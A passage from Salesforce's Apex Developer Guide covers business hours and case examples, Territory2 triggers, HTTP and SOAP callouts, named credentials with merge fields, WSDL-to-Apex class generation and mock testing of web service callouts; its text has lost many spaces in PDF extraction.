// CreateDatetimeon May 28, 2008at 1:06:08AM in localtimezone.
DatetimestartTime= Datetime.newInstance(2008,5, 28, 1, 6, 8);
// CreateDatetimeon May 28, 2008at 4:06:08PM in localtimezone.
DatetimeendTime= Datetime.newInstance(2008,5, 28, 16, 6, 8);
// Findthe numberof businesshoursmillisecondsbetweenstartTimeand endTimeas
// definedby the defaultbusinesshours.Willreturna negativevalueif endTimeis
// beforestartTime,0 if equal,positivevalueotherwise.
Longdiff= BusinessHours.diff(bh.id,startTime,endTime);
Working with Cases
Incoming and outgoing email messages can be associated with their corresponding cases using the Cases class
getCaseIdFromEmailThreadId method. This method is used with Email-to-Case, which is an automated process that turns
emails received from customers into customer service cases.
The following example uses an email thread ID to retrieve the related case ID.
publicclassGetCaseIdController{
publicstaticvoidgetCaseIdSample(){
// Get emailthreadID
StringemailThreadId= '_00Dxx1gEW._500xxYktg';
// CallApexmethodto retrievecaseID fromemailthreadID
ID caseId= Cases.getCaseIdFromEmailThreadId(emailThreadId);
}
}
SEE ALSO:
Apex Reference Guide: BusinessHours Class
Apex Reference Guide: Cases Class
Territory Management 2.0
With trigger support for the Territory2 and UserTerritory2Association standard objects, you can automate actions and processes related
to changes in these territory management records.
595
Using Salesforce Features with ApexApex Developer Guide

Sample Trigger for Territory2
This example trigger fires after Territory2 records have been created or deleted. This example trigger assumes that an organization has
a custom field called TerritoryCount__c defined on the Territory2Model object to track the net number of territories in each
territory model. The trigger code increments or decrements the value in the TerritoryCount__c field each time a territory is
created or deleted.
triggermaintainTerritoryCounton Territory2(afterinsert, afterdelete) {
// Trackthe effectivedeltafor eachmodel
Map<Id,Integer> modelMap= new Map<Id,Integer>();
for(Territory2terr: (Trigger.isInsert? Trigger.new : Trigger.old)){
Integeroffset= 0;
if(modelMap.containsKey(terr.territory2ModelId)){
offset= modelMap.get(terr.territory2ModelId);
}
offset+= (Trigger.isInsert? 1 : -1);
modelMap.put(terr.territory2ModelId,offset);
}
// We havea customfieldon Territory2ModelcalledTerritoryCount__c
List<Territory2Model>models= [SELECTId, TerritoryCount__cFROM
Territory2ModelWHEREId IN :modelMap.keySet()];
for(Territory2Modeltm : models){
// In casethe fieldis not definedwitha defaultof 0
if(tm.TerritoryCount__c== null) {
tm.TerritoryCount__c= 0;
}
tm.TerritoryCount__c+= modelMap.get(tm.Id);
}
// Bulkupdatethe fieldon all the impactedmodels
update(models);
}
Sample Trigger for UserTerritory2Association
This example trigger fires after UserTerritory2Association records have been created. This example trigger sends an email notification to
the Sales Operations group letting them know that users have been added to territories. It identifies the user who added users to
territories. Then, it identifies each added user along with which territory the user was added to and which territory model the territory
belongs to.
triggernotifySalesOpson UserTerritory2Association(afterinsert) {
// Querythe detailsof the usersand territoriesinvolved
List<UserTerritory2Association>utaList= [SELECTId, User.FirstName,User.LastName,
Territory2.Name,Territory2.Territory2Model.Name
FROMUserTerritory2AssociationWHEREId IN :Trigger.New];
// Emailmessageto send
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
mail.setToAddresses(new String[]{'salesOps@acme.com'});
mail.setSubject('Usersaddedto territoriesnotification');
// Buildthe messagebody
List<String> msgBody= new List<String>();
StringaddedToTerrStr= '{0},{1} addedto territory{2} in model{3} \n';
596
Using Salesforce Features with ApexApex Developer Guide

msgBody.add('Thefollowinguserswereaddedto territoriesby ' +
UserInfo.getFirstName()+ ', ' + UserInfo.getLastName()+ '\n');
for(UserTerritory2Associationuta : utaList){
msgBody.add(String.format(addedToTerrStr,
new String[]{uta.User.FirstName,uta.User.LastName,
uta.Territory2.Name,uta.Territory2.Territory2Model.Name}));
}
// Set the messagebodyand sendthe email
mail.setPlainTextBody(String.join(msgBody,''));
Messaging.sendEmail(new Messaging.Email[]{ mail});
}
Integration and Apex Utilities
Apex allows you to integrate with external SOAP and REST Web services using callouts. You can use utilities for JSON, XML, data security,
and encoding. A general-purpose utility for regular expressions with text strings is also provided.
Invoking Callouts Using Apex
JSON Support
JavaScript Object Notation (JSON) support in Apex enables the serialization of Apex objects into JSON format and the deserialization
of serialized JSON content.
XML Support
Apex provides utility classes that enable the creation and parsing of XML content using streams and the DOM.
ZIP Support
Take advantage of a native Apex Zip library to create and extract ZIP archive files by using the class methods in the Compression
namespace.
Securing Your Data
You can secure your data by using the methods provided by the Crypto class.
Encoding Your Data
You can encode and decode URLs and convert strings to hexadecimal format by using the methods provided by the EncodingUtil
class.
Using Patterns and Matchers
Apex provides patterns and matchers that enable you to search text using regular expressions.
Invoking Callouts Using Apex
An Apex callout enables you to tightly integrate your Apex with an external service by making a call to an external Web service or sending
a HTTP request from Apex code and then receiving the response. Apex provides integration with Web services that utilize SOAP and
WSDL, or HTTP services (RESTful services).
Note:  Before any Apex callout can call an external site, that site must be registered in the Remote Site Settings page, or the callout
fails. Salesforce prevents calls to unauthorized network addresses.
If the callout specifies a named credential as the endpoint, you don’t need to configure remote site settings. A named credential
specifies the URL of a callout endpoint and its required authentication parameters in one definition. To set up named credentials,
see “Define a Named Credential” in the Salesforce Help.
597
Integration and Apex UtilitiesApex Developer Guide

To learn more about the types of callouts, see:
•
SOAP Services: Defining a Class from a WSDL Document on page 603
•
Invoking HTTP Callouts on page 616
•
Asynchronous Callouts for Long-Running Requests on page 628
Tip:  Callouts enable Apex to invoke external web or HTTP services. Apex Web services allow an external application to invoke
Apex methods through Web services.
1.Adding Remote Site Settings
2.Named Credentials as Callout Endpoints
A named credential specifies the URL of a callout endpoint and its required authentication parameters in one definition. Salesforce
manages all authentication for Apex callouts that specify a named credential as the callout endpoint so that your code doesn’t have
to. You can also skip remote site settings, which are otherwise required for callouts to external sites, for the site defined in the named
credential.
3.SOAP Services: Defining a Class from a WSDL Document
4.Invoking HTTP Callouts
5.Using Certificates
6.Callout Limits and Limitations
7.Make Long-Running Callouts with Continuations
Use asynchronous callouts to make long-running requests from a Visualforce page or a Lightning component to an external Web
service and process responses in callback methods.
Adding Remote Site Settings
Before any Apex callout can call an external site, that site must be registered in the Remote Site Settings page, or the callout fails. Salesforce
prevents calls to unauthorized network addresses.
Note:  If the callout specifies a named credential as the endpoint, you don’t need to configure remote site settings. A named
credential specifies the URL of a callout endpoint and its required authentication parameters in one definition. To set up named
credentials, see “Define a Named Credential” in the Salesforce Help.
To add a remote site setting:
1.From Setup, enter RemoteSiteSettings in the QuickFind box, then select Remote Site Settings.
2.Click New Remote Site.
3.Enter a descriptive term for the RemoteSiteName.
4.Enter the URL for the remote site.
5.Optionally, enter a description of the site.
6.Click Save.
Tip:  For best performance, verify that your remote HTTPS encrypted sites have OCSP (Online Certificate Status Protocol) stapling
turned on.
598
Integration and Apex UtilitiesApex Developer Guide

Named Credentials as Callout Endpoints
A named credential specifies the URL of a callout endpoint and its required authentication parameters in one definition. Salesforce
manages all authentication for Apex callouts that specify a named credential as the callout endpoint so that your code doesn’t have to.
You can also skip remote site settings, which are otherwise required for callouts to external sites, for the site defined in the named
credential.
Named Credentials also include an OutboundNetworkConnection field that you can use to route callouts through a private connection.
By separating the endpoint URL and authentication from the callout definition, named credentials make callouts easier to maintain. For
example, if an endpoint URL changes, you update only the named credential. All callouts that reference the named credential simply
continue to work.
If you have multiple orgs, you can create a named credential with the same name but with a different endpoint URL in each org. You
can then package and deploy—on all the orgs—one callout definition that references the shared name of those named credentials.
For example, the named credential in each org can have a different endpoint URL to accommodate differences in development and
production environments. If an Apex callout specifies the shared name of those named credentials, the Apex class that defines the callout
can be packaged and deployed on all those orgs without programmatically checking the environment.
To reference a named credential from a callout definition, use the named credential URL. A named credential URL contains the scheme
callout:, the name of the named credential, and an optional path. For example:
callout:My_Named_Credential/some_path.
You can append a query string to a named credential URL. Use a question mark (?) as the separator between the named credential URL
and the query string. For example: callout:My_Named_Credential/some_path?format=json.
Example:  In the following Apex code, a named credential and an appended path specify the callout’s endpoint.
HttpRequestreq = new HttpRequest();
req.setEndpoint('callout:My_Named_Credential/some_path');
req.setMethod('GET');
Httphttp= new Http();
HTTPResponseres = http.send(req);
System.debug(res.getBody());
The referenced named credential specifies the endpoint URL and an external credential that specifies authentication settings.
599
Integration and Apex UtilitiesApex Developer Guide

The Apex code remains the same no matter what authentication you use. The authentication settings differ in the external credential,
which references an authentication provider that’s defined in the org.
600
Integration and Apex UtilitiesApex Developer Guide

In contrast, let’s see what the Apex code looks like without a named credential. Notice that the code becomes more complex to
handle authentication, even if we stick with basic password authentication. Coding OAuth is even more complex and is an ideal
use case for named credentials.
HttpRequestreq = new HttpRequest();
req.setEndpoint('https://my_endpoint.example.com/some_path');
req.setMethod('GET');
// Becausewe didn'tset the endpointas a namedcredential,
// our codehas to specify:
// - The requiredusernameand passwordto accessthe endpoint
// - The headerand headerinformation
Stringusername= 'myname';
Stringpassword= 'mypwd';
BlobheaderValue= Blob.valueOf(username+ ':' + password);
StringauthorizationHeader= 'BASIC' +
EncodingUtil.base64Encode(headerValue);
req.setHeader('Authorization',authorizationHeader);
// Createa new httpobjectto sendthe requestobject
// A responseobjectis generatedas a resultof the request
Httphttp= new Http();
HTTPResponseres = http.send(req);
System.debug(res.getBody());
1.Custom Headers and Bodies of Apex Callouts That Use Named Credentials
Salesforce generates a standard authorization header for each callout to a named-credential-defined endpoint, but you can disable
this option. Your Apex code can also use merge fields to construct each callout’s HTTP header and body.
2.Merge Fields for Apex Callouts That Use Named Credentials
To construct the HTTP headers and request bodies of callouts to endpoints that are specified as named credentials, use these merge
fields in your Apex code.
SEE ALSO:
Invoking Callouts Using Apex
Salesforce Help: Named Credentials
Salesforce Help: Authentication Providers
Named Credentials Developer Guide: Get Started with Named Credentials
Named Credentials Developer Guide: Named Credential API Links
Custom Headers and Bodies of Apex Callouts That Use Named Credentials
Salesforce generates a standard authorization header for each callout to a named-credential-defined endpoint, but you can disable this
option. Your Apex code can also use merge fields to construct each callout’s HTTP header and body.
601
Integration and Apex UtilitiesApex Developer Guide

This flexibility enables you to use named credentials in special situations. For example, some remote endpoints require security tokens
or encrypted credentials in request headers. Some remote endpoints expect usernames and passwords in XML or JSON message bodies.
Customize the callout headers and bodies as needed.
The Salesforce admin must set up the named credential to allow Apex code to construct headers or use merge fields in HTTP headers
or bodies. The following table describes these callout options for the named credential.
DescriptionField
By default, Salesforce generates an authorization header and applies it to
each callout that references the named credential.
Deselect this option only if one of the following statements applies.
GenerateAuthorizationHeader
•
The remote endpoint doesn’t support authorization headers.
•
The authorization headers are provided by other means. For example, in
Apex callouts, the developer can have the code construct a custom
authorization header for each callout.
This option is required if you reference the named credential from an external
data source.
In each Apex callout, the code specifies how the HTTP header and request
body are constructed. For example, the Apex code can set the value of a
cookie in an authorization header.
These options enable the Apex code to use merge fields to populate the
HTTP header and request body with org data when the callout is made.
AllowMergeFieldsin HTTPHeader
AllowMergeFieldsin HTTPBody
These options aren’t available if you reference the named credential from an
external data source.
SEE ALSO:
Merge Fields for Apex Callouts That Use Named Credentials
Salesforce Help: Named Credentials
Merge Fields for Apex Callouts That Use Named Credentials
To construct the HTTP headers and request bodies of callouts to endpoints that are specified as named credentials, use these merge
fields in your Apex code.
DescriptionMerge Field
Username and password of the running user. Available only if the named
credential uses password authentication.
// non-standardauthentication
req.setHeader('X-Username',
{!$Credential.Username}
{!$Credential.Password}
'{!$Credential.Username}');
req.setHeader('X-Password',
'{!$Credential.Password}');
602
Integration and Apex UtilitiesApex Developer Guide

DescriptionMerge Field
OAuth token of the running user. Available only if the named credential uses
OAuth authentication.
req.setHeader('Authorization',
'{!$Credential.OAuthToken}');
{!$Credential.OAuthToken}
Valid values depend on the authentication protocol of the named credential.{!$Credential.AuthorizationMethod}
•
Basic—password authentication
•
Bearer—OAuth 2.0
•
null—no authentication
Valid values depend on the authentication protocol of the named credential.{!$Credential.AuthorizationHeaderValue}
•
Base-64encodedusernameand password—password
authentication
•
OAuthtoken—OAuth 2.0
•
null—no authentication
Consumer key. Available only if the named credential uses OAuth
authentication.
{!$Credential.OAuthConsumerKey}
When you use merge fields to construct HTTP headers and request bodies, keep these considerations in mind.
•
To allow Apex code to use merge fields to populate the HTTP header and request body with org data when the callout is made, a
Salesforce admin must enable Allow Merge Fields in HTTP Header and Allow Merge Fields in HTTP Body on the named
credential. See Create or Edit a Named Credential in Salesforce Help.
•
To access or input custom headers, use Connect REST API. See Named Credentials Resources in the Connect REST API Developer
Guide.
•
When you use these merge fields in HTTP request bodies of callouts, you can apply the HTMLENCODE formula function to escape
special characters. The formula must start with HTMLENCODE, and other formula functions aren't supported. HTMLENCODE can’t
be used on merge fields in HTTP headers. This example escapes special characters that are in the credentials.
req.setBody('Username:{!HTMLENCODE($Credential.Username)}')
req.setBody('Password:{!HTMLENCODE($Credential.Password)}')
•
When you use these merge fields in SOAP API calls, OAuth access tokens aren’t refreshed.
SEE ALSO:
Custom Headers and Bodies of Apex Callouts That Use Named Credentials
Named Credentials as Callout Endpoints
Knowledge Article: Named credential OAuth token doesn't get automatically refreshed with Salesforce SOAP API endpoint
SOAP Services: Defining a Class from a WSDL Document
Classes can be automatically generated from a WSDL document that is stored on a local hard drive or network. Creating a class by
consuming a WSDL document allows developers to make callouts to the external Web service in their Apex code.
603
Integration and Apex UtilitiesApex Developer Guide

Note:  Use Outbound Messaging to handle integration solutions when possible. Use callouts to third-party Web services only
when necessary.
To generate an Apex class from a WSDL:
1.In the application, from Setup, enter ApexClasses in the QuickFind box, then select Apex Classes.
2.Click Generate from WSDL.
3.Click Browse to navigate to a WSDL document on your local hard drive or network, or type in the full path. This WSDL document is
the basis for the Apex class you are creating.
Note: The WSDL document that you specify might contain a SOAP endpoint location that references an outbound port.
For security reasons, Salesforce restricts the outbound ports you can specify to one of the following:
•
80: This port only accepts HTTP connections.
•
443: This port only accepts HTTPS connections.
•
1024–66535 (inclusive): These ports accept HTTP or HTTPS connections.
4.Click Parse WSDL to verify the WSDL document contents. The application generates a default class name for each namespace in
the WSDL document and reports any errors. Parsing fails if the WSDL contains schema types or constructs that aren’t supported by
Apex classes, or if the resulting classes exceed the 1 million character limit on Apex classes. For example, the Salesforce SOAP API
WSDL cannot be parsed.
5.Modify the class names as desired. While you can save more than one WSDL namespace into a single class by using the same class
name for each namespace, Apex classes can be no more than 1 million characters total.
6.Click Generate Apex. The final page of the wizard shows which classes were successfully generated, along with any errors from
other classes. The page also provides a link to view successfully generated code.
The successfully generated Apex classes include stub and type classes for calling the third-party Web service represented by the WSDL
document. These classes allow you to call the external Web service from Apex. For each generated class, a second class is created with
the same name and with a prefix of Async. The first class is for synchronous callouts. The second class is for asynchronous callouts. For
more information about asynchronous callouts, see Make Long-Running Callouts with Continuations.
Note the following about the generated Apex:
•
If a WSDL document contains an Apex reserved word, the word is appended with _x when the Apex class is generated. For example,
limit in a WSDL document converts to limit_x in the generated Apex class. See Reserved Keywords. For details on handling
characters in element names in a WSDL that are not supported in Apex variable names, see Considerations Using WSDLs.
•
If an operation in the WSDL has an output message with more than one element, the generated Apex wraps the elements in an
inner class. The Apex method that represents the WSDL operation returns the inner class instead of the individual elements.
•
Since periods (.) are not allowed in Apex class names, any periods in WSDL names used to generate Apex classes are replaced by
underscores (_) in the generated Apex code.
After you have generated a class from the WSDL, you can invoke the external service referenced by the WSDL.
Note:  Before you can use the samples in the rest of this topic, you must copy the Apex class docSampleClass from Generated
WSDL2Apex Code and add it to your organization.
604
Integration and Apex UtilitiesApex Developer Guide

Invoking an External Service
To invoke an external service after using its WSDL document to generate an Apex class, create an instance of the stub in your Apex code
and call the methods on it. For example, to invoke the StrikeIron IP address lookup service from Apex, you could write code similar to
the following:
// Createthe stub
strikeironIplookup.DNSSoapdns = new strikeironIplookup.DNSSoap();
// Set up the licenseheader
dns.LicenseInfo= new strikeiron.LicenseInfo();
dns.LicenseInfo.RegisteredUser= new strikeiron.RegisteredUser();
dns.LicenseInfo.RegisteredUser.UserID= 'you@company.com';
dns.LicenseInfo.RegisteredUser.Password= 'your-password';
// Makethe Web servicecall
strikeironIplookup.DNSInfoinfo= dns.DNSLookup('www.myname.com');
HTTP Header Support
You can set the HTTP headers on a Web service callout. For example, you can use this feature to set the value of a cookie in an authorization
header. To set HTTP headers, add inputHttpHeaders_x and outputHttpHeaders_x to the stub.
Note: In API versions 16.0 and earlier, HTTP responses for callouts are always decoded using UTF-8, regardless of the Content-Type
header. In API versions 17.0 and later, HTTP responses are decoded using the encoding specified in the Content-Type header.
The following samples work with the sample WSDL file in Generated WSDL2Apex Code on page 609:
Sending HTTP Headers on a Web Service Callout
docSample.DocSamplePortstub= new docSample.DocSamplePort();
stub.inputHttpHeaders_x= new Map<String, String>();
//Settinga basicauthenticationheader
// Tip:Use namedcredentialsinstead.
stub.inputHttpHeaders_x.put('Authorization', 'BasicQWxhZGRpbjpvcGVuIHNlc2FtZQ==');
//Settinga cookieheader
stub.inputHttpHeaders_x.put('Cookie', 'name=value');
//Settinga customHTTPheader
stub.inputHttpHeaders_x.put('myHeader', 'myValue');
Stringinput= 'Thisis the inputstring';
Stringoutput= stub.EchoString(input);
If a value for inputHttpHeaders_x is specified, it overrides the standard headers set.
Tip:  Instead of hardcoding the Authorization header value, use named credentials. Named credentials offer a declarative
and secure way to store and manage the credentials needed for HTTP callouts so that Salesforce can authenticate with external
APIs. For more information, see Named Credentials in Salesforce Help.
605
Integration and Apex UtilitiesApex Developer Guide

Accessing HTTP Response Headers from a Web Service Callout Response
docSample.DocSamplePortstub= new docSample.DocSamplePort();
stub.outputHttpHeaders_x= new Map<String, String>();
Stringinput= 'Thisis the inputstring';
Stringoutput= stub.EchoString(input);
//Gettingcookieheader
Stringcookie= stub.outputHttpHeaders_x.get('Set-Cookie');
//Gettingcustomheader
StringmyHeader= stub.outputHttpHeaders_x.get('My-Header');
The value of outputHttpHeaders_x is null by default. You must set outputHttpHeaders_x before you have access to the
content of headers in the response.
Supported WSDL Features
Apex supports only the document literal wrapped WSDL style and the following primitive and built-in datatypes:
Apex TypeSchema Type
Stringxsd:anyURI
Booleanxsd:boolean
Datexsd:date
Datetimexsd:dateTime
Doublexsd:double
Doublexsd:float
Integerxsd:int
Integerxsd:integer
Stringxsd:language
Longxsd:long
Stringxsd:Name
Stringxsd:NCName
Integerxsd:nonNegativeInteger
Stringxsd:NMTOKEN
Stringxsd:NMTOKENS
Stringxsd:normalizedString
Stringxsd:NOTATION
Integerxsd:positiveInteger
Stringxsd:QName
606
Integration and Apex UtilitiesApex Developer Guide

Apex TypeSchema Type
Integerxsd:short
Stringxsd:string
Datetimexsd:time
Stringxsd:token
Integerxsd:unsignedInt
Longxsd:unsignedLong
Integerxsd:unsignedShort
Note:  The Salesforce datatype anyType is not supported in WSDLs used to generate Apex code that is saved using API version
15.0 and later. For code saved using API version 14.0 and earlier, anyType is mapped to String.
Apex also supports the following schema constructs:
•
xsd:all, in Apex code saved using API version 15.0 and later
•
xsd:annotation, in Apex code saved using API version 15.0 and later
•
xsd:attribute, in Apex code saved using API version 15.0 and later
•
xsd:choice, in Apex code saved using API version 15.0 and later
•
xsd:element. In Apex code saved using API version 15.0 and later, the ref attribute is also supported with the following
restrictions:
–
You cannot call a ref in a different namespace.
–
A global element cannot use ref.
–
If an element contains ref, it cannot also contain name or type.
•
xsd:sequence
The following data types are only supported when used as call ins, that is, when an external Web service calls an Apex Web service
method. These data types are not supported as callouts, that is, when an Apex Web service method calls an external Web service.
•
blob
•
decimal
•
enum
Apex does not support any other WSDL constructs, types, or services, including:
•
RPC/encoded services
•
WSDL files with multiple portTypes, multiple services, or multiple bindings
•
WSDL files that import external schemas. For example, the following WSDL fragment imports an external schema, which is not
supported:
<wsdl:types>
<xsd:schema
elementFormDefault="qualified"
targetNamespace="http://s3.amazonaws.com/doc/2006-03-01/">
<xsd:includeschemaLocation="AmazonS3.xsd"/>
607
Integration and Apex UtilitiesApex Developer Guide

</xsd:schema>
</wsdl:types>
However, an import within the same schema is supported. In the following example, the external WSDL is pasted into the WSDL
you are converting:
<wsdl:types>
<xsd:schema
xmlns:tns="http://s3.amazonaws.com/doc/2006-03-01/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
elementFormDefault="qualified"
targetNamespace="http://s3.amazonaws.com/doc/2006-03-01/">
<xsd:elementname="CreateBucket">
<xsd:complexType>
<xsd:sequence>
[...]
</xsd:schema>
</wsdl:types>
•
Any schema types not documented in the previous table
•
WSDLs that exceed the size limit, including the Salesforce WSDLs
•
WSDLs that don’t use the document literal wrapped style. The following WSDL snippet doesn’t use document literal wrapped style
and results in an “Unable to find complexType” error when imported.
<wsdl:types>
<xsd:schematargetNamespace="http://test.org/AccountPollInterface/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<xsd:elementname="SFDCPollAccountsResponse"type="tns:SFDCPollResponse"/>
<xsd:simpleTypename="SFDCPollResponse">
<xsd:restrictionbase="xsd:string"/>
</xsd:simpleType>
</xsd:schema>
</wsdl:types>
This modified version wraps the simpleType element as a complexType that contains a sequence of elements. This follows
the document literal style and is supported.
<wsdl:types>
<xsd:schematargetNamespace="http://test.org/AccountPollInterface/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<xsd:elementname="SFDCPollAccountsResponse"type="tns:SFDCPollResponse"/>
<xsd:complexTypename="SFDCPollResponse">
<xsd:sequence>
<xsd:elementname="SFDCOutput"type="xsd:string"/>
</xsd:sequence>
</xsd:complexType>
</xsd:schema>
</wsdl:types>
1.Generated WSDL2Apex Code
You can generate Apex classes from a WSDL document using the WSDL2Apex tool. The WSDL2Apex tool is open source and available
on GitHub.
608
Integration and Apex UtilitiesApex Developer Guide

2.Test Web Service Callouts
Generated code is saved as an Apex class containing the methods you can invoke for calling the web service. To deploy or package
this Apex class and other accompanying code, 75% of the code must have test coverage, including the methods in the generated
class. By default, test methods don’t support web service callouts, and tests that perform web service callouts fail. To prevent tests
from failing and to increase code coverage, Apex provides the built-in WebServiceMock interface and the Test.setMock
method. Use WebServiceMock and Test.setMock to receive fake responses in a test method.
3.Performing DML Operations and Mock Callouts
4.Considerations Using WSDLs
Generated WSDL2Apex Code
You can generate Apex classes from a WSDL document using the WSDL2Apex tool. The WSDL2Apex tool is open source and available
on GitHub.
You can find and contribute to the WSDL2Apex source code in the WSDL2Apex repository on GitHub.
The following example shows how an Apex class is created from a WSDL document. The Apex class is auto-generated for you when you
import the WSDL.
The following code shows a sample WSDL document.
<wsdl:definitionsxmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
xmlns:s="http://www.w3.org/2001/XMLSchema"
xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
xmlns:tns="http://doc.sample.com/docSample"
targetNamespace="http://doc.sample.com/docSample"
xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
<!--Above,the schematargetNamespacemapsto the Apexclassname.-->
<!--Below,the typedefinitionsfor the parametersare listed.
EachcomplexTypeand simpleTypeparameterismappedto an Apexclassinsidethe parent
classfor the WSDL.Then,eachelementin the complexTypeis mappedto a publicfield
insidethe class.-->
<wsdl:types>
<s:schemaelementFormDefault="qualified"
targetNamespace="http://doc.sample.com/docSample">
<s:elementname="EchoString">
<s:complexType>
<s:sequence>
<s:elementminOccurs="0" maxOccurs="1" name="input"type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
<s:elementname="EchoStringResponse">
<s:complexType>
<s:sequence>
<s:elementminOccurs="0" maxOccurs="1" name="EchoStringResult"
type="s:string"/>
</s:sequence>
</s:complexType>
609
Integration and Apex UtilitiesApex Developer Guide

</s:element>
</s:schema>
</wsdl:types>
<!--Thestubbelowdefinesoperations.-->
<wsdl:messagename="EchoStringSoapIn">
<wsdl:partname="parameters"element="tns:EchoString"/>
</wsdl:message>
<wsdl:messagename="EchoStringSoapOut">
<wsdl:partname="parameters"element="tns:EchoStringResponse"/>
</wsdl:message>
<wsdl:portTypename="DocSamplePortType">
<wsdl:operationname="EchoString">
<wsdl:inputmessage="tns:EchoStringSoapIn"/>
<wsdl:outputmessage="tns:EchoStringSoapOut"/>
</wsdl:operation>
</wsdl:portType>
<!--Thecodebelowdefineshow the typesmap to SOAP.-->
<wsdl:bindingname="DocSampleBinding"type="tns:DocSamplePortType">
<wsdl:operationname="EchoString">
<soap:operationsoapAction="urn:dotnet.callouttest.soap.sforce.com/EchoString"
style="document"/>
<wsdl:input>
<soap:bodyuse="literal"/>
</wsdl:input>
<wsdl:output>
<soap:bodyuse="literal"/>
</wsdl:output>
</wsdl:operation>
</wsdl:binding>
<!--Finally,the codebelowdefinesthe endpoint,whichmapsto the endpointin the class
-->
<wsdl:servicename="DocSample">
<wsdl:portname="DocSamplePort"binding="tns:DocSampleBinding">
<soap:addresslocation="http://YourServer/YourService"/>
</wsdl:port>
</wsdl:service>
</wsdl:definitions>
From this WSDL document, the following Apex class is auto-generated. The class name docSample is the name you specify when
importing the WSDL.
//Generatedby wsdl2apex
publicclassdocSample{
publicclassEchoStringResponse_element{
publicStringEchoStringResult;
privateString[] EchoStringResult_type_info= new String[]{
'EchoStringResult',
610
Integration and Apex UtilitiesApex Developer Guide

'http://doc.sample.com/docSample',
null,'0','1','false'};
privateString[] apex_schema_type_info= new String[]{
'http://doc.sample.com/docSample',
'true','false'};
privateString[] field_order_type_info= new String[]{
'EchoStringResult'};
}
publicclassEchoString_element{
publicStringinput;
privateString[] input_type_info= new String[]{
'input',
'http://doc.sample.com/docSample',
null,'0','1','false'};
privateString[] apex_schema_type_info= new String[]{
'http://doc.sample.com/docSample',
'true','false'};
privateString[] field_order_type_info= new String[]{'input'};
}
publicclassDocSamplePort{
publicStringendpoint_x= 'http://YourServer/YourService';
publicMap<String,String> inputHttpHeaders_x;
publicMap<String,String> outputHttpHeaders_x;
publicStringclientCertName_x;
publicStringclientCert_x;
publicStringclientCertPasswd_x;
publicIntegertimeout_x;
privateString[] ns_map_type_info= new String[]{
'http://doc.sample.com/docSample', 'docSample'};
publicStringEchoString(Stringinput){
docSample.EchoString_elementrequest_x= new
docSample.EchoString_element();
request_x.input= input;
docSample.EchoStringResponse_elementresponse_x;
Map<String, docSample.EchoStringResponse_element>response_map_x=
new Map<String, docSample.EchoStringResponse_element>();
response_map_x.put('response_x', response_x);
WebServiceCallout.invoke(
this,
request_x,
response_map_x,
new String[]{endpoint_x,
'urn:dotnet.callouttest.soap.sforce.com/EchoString',
'http://doc.sample.com/docSample',
'EchoString',
'http://doc.sample.com/docSample',
'EchoStringResponse',
'docSample.EchoStringResponse_element'}
);
response_x= response_map_x.get('response_x');
returnresponse_x.EchoStringResult;
}
}
}
611
Integration and Apex UtilitiesApex Developer Guide

Note the following mappings from the original WSDL document:
•
The WSDL target namespace maps to the Apex class name.
•
Each complex type becomes a class. Each element in the type is a public field in the class.
•
The WSDL port name maps to the stub class.
•
Each operation in the WSDL maps to a public method.
You can use the auto-generated docSample class to invoke external Web services. The following code calls the echoString
method on the external server.
docSample.DocSamplePortstub= new docSample.DocSamplePort();
Stringinput= 'Thisis the inputstring';
Stringoutput= stub.EchoString(input);
Test Web Service Callouts
Generated code is saved as an Apex class containing the methods you can invoke for calling the web service. To deploy or package this
Apex class and other accompanying code, 75% of the code must have test coverage, including the methods in the generated class. By
default, test methods don’t support web service callouts, and tests that perform web service callouts fail. To prevent tests from failing
and to increase code coverage, Apex provides the built-in WebServiceMock interface and the Test.setMock method. Use
WebServiceMock and Test.setMock to receive fake responses in a test method.
Specify a Mock Response for Testing Web Service Callouts
When you create an Apex class from a WSDL, the methods in the auto-generated class call WebServiceCallout.invoke, which
performs the callout to the external service. When testing these methods, you can instruct the Apex runtime to generate a fake response
whenever WebServiceCallout.invoke is called. To do so, implement the WebServiceMock interface and specify a fake
response for the Apex runtime to send. Here are the steps in more detail.
First, implement the WebServiceMock interface and specify the fake response in the doInvoke method.
globalclassYourWebServiceMockImplimplementsWebServiceMock{
globalvoiddoInvoke(
Objectstub,
Objectrequest,
Map<String,Object>response,
Stringendpoint,
StringsoapAction,
StringrequestName,
StringresponseNS,
StringresponseName,
StringresponseType){
// Createresponseelementfromthe autogeneratedclass.
// Populateresponseelement.
// Add responseelementto the responseparameter,as follows:
response.put('response_x',responseElement);
}
}
Note:
•
The class implementing the WebServiceMock interface can be either global or public.
612
Integration and Apex UtilitiesApex Developer Guide

•
You can annotate this class with @isTest because it is used only in a test context. In this way, you can exclude it from your
org’s code size limit of 6 MB.
Now that you have specified the values of the fake response, instruct the Apex runtime to send this fake response by calling
Test.setMock in your test method. For the first argument, pass WebServiceMock.class, and for the second argument,
pass a new instance of your interface implementation of WebServiceMock, as follows:
Test.setMock(WebServiceMock.class, newYourWebServiceMockImpl());
After this point, if a web service callout is invoked in test context, the callout is not made. You receive the mock response specified in
your doInvoke method implementation.
Note:  To mock a callout if the code that performs the callout is in a managed package, call Test.setMock from a test method
in the same package with the same namespace.
This example shows how to test a web service callout. The implementation of the WebServiceMock interface is listed first. This
example implements the doInvoke method, which returns the response you specify. In this case, the response element of the
auto-generated class is created and assigned a value. Next, the response Map parameter is populated with this fake response. This
example is based on the WSDL listed in Generated WSDL2Apex Code. Import this WSDL and generate a class called docSample
before you save this class.
@isTest
globalclassWebServiceMockImplimplementsWebServiceMock{
globalvoiddoInvoke(
Objectstub,
Objectrequest,
Map<String, Object> response,
Stringendpoint,
StringsoapAction,
StringrequestName,
StringresponseNS,
StringresponseName,
StringresponseType){
docSample.EchoStringResponse_elementrespElement=
new docSample.EchoStringResponse_element();
respElement.EchoStringResult= 'Mockresponse';
response.put('response_x', respElement);
}
}
This method makes a web service callout.
publicclassWebSvcCallout{
publicstaticStringcallEchoString(Stringinput){
docSample.DocSamplePortsample= new docSample.DocSamplePort();
sample.endpoint_x= 'https://example.com/example/test';
// Thisinvokesthe EchoStringmethodin the generatedclass
